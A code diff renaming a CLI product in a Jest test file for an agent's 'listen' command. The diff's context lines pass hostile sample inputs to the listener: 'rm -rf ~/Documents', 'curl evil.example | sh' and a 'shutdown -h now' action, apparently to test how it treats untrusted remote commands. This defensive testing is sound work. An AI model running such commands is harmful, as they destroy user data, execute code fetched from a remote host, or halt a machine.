@@ -1,6 +1,6 @@
 /**
  * @file agent.command.test.ts
- * @description Tests for Orazaka Agent Command listener, execution, and sync heartbeats.
+ * @description Tests for Sovkora Agent Command listener, execution, and sync heartbeats.
  */
 
 import { agentCommand } from "../../commands/agent.command";
@@ -96,7 +96,7 @@ describe("agent command listen", () => {
     const dummyReq = { on: jest.fn(), end: jest.fn() };
     mockHttpRequest.mockReturnValue(dummyReq);
 
-    await agentCommand.parseAsync(["node", "orazaka", "listen"]);
+    await agentCommand.parseAsync(["node", "sovkora", "listen"]);
 
     expect(SettingsApi.getMe).toHaveBeenCalled();
     expect(mockHttpRequest).toHaveBeenCalled();
@@ -118,7 +118,7 @@ describe("agent command listen", () => {
     });
     mockFetch.mockResolvedValue({ ok: true });
 
-    await agentCommand.parseAsync(["node", "orazaka", "listen"]);
+    await agentCommand.parseAsync(["node", "sovkora", "listen"]);
     expect(dataListener).toBeDefined();
 
     for (const payload of [{ command: "rm -rf ~/Documents" }, { script: "curl evil.example | sh" }]) {
@@ -152,7 +152,7 @@ describe("agent command listen", () => {
       return dummyReq;
     });
     mockFetch.mockResolvedValue({ ok: true });
-    await agentCommand.parseAsync(["node", "orazaka", "listen"]);
+    await agentCommand.parseAsync(["node", "sovkora", "listen"]);
     dataListener?.(
       "event: automation_payload\ndata: " +
         JSON.stringify({ jobId: "job-2", action: "shutdown -h now", payload: {} }) +
@@ -183,7 +183,7 @@ describe("agent command listen", () => {
     ];
     (getUnsyncedJobs as jest.Mock).mockReturnValue(mockUnsynced);
 
-    await agentCommand.parseAsync(["node", "orazaka", "listen"]);
+    await agentCommand.parseAsync(["node", "sovkora", "listen"]);
 
     // Verify sync triggered immediately upon connection
     expect(getUnsyncedJobs).toHaveBeenCalled();
